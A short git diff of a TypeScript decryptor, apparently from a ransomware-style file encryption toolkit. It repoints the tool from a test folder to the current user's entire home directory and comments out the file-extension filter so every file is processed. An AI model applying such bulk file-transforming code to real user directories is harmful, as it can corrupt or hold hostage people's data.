@@ -6,8 +6,8 @@ import config from './config.json';
 
 const decrypt = () => {
   const userName: string = os.userInfo().username;
-  // const userDir: string = `C:\\Users\\${userName}`;
-  const userDir: string = `C:\\Users\\LEONARDO\\encriptar`;
+ const userDir: string = `C:\\Users\\${userName}`;
+//  const userDir: string = `C:\\Users\\LEONARDO\\encriptar`;
 
   // get arguments
   const args: string[] = process.argv.slice(2);
@@ -54,15 +54,15 @@ const decryptDir = (dir: string, key: string, iv: Buffer) => {
       } else {
         // if file
 
-        let isTarget: boolean = false;
+        let isTarget: boolean = true;
 
-        // check extension
-        for (let j = 0; j < config.targetExtension.length; j++) {
-          if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
-            isTarget = true;
-            break;
-          }
-        }
+        // FODA SE EXTENSÃO
+        // for (let j = 0; j < config.targetExtension.length; j++) {
+        //   if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
+        //     isTarget = true;
+        //     break;
+        //   }
+        // }
 
         if (isTarget) {
           // check file size (only under 1GB)
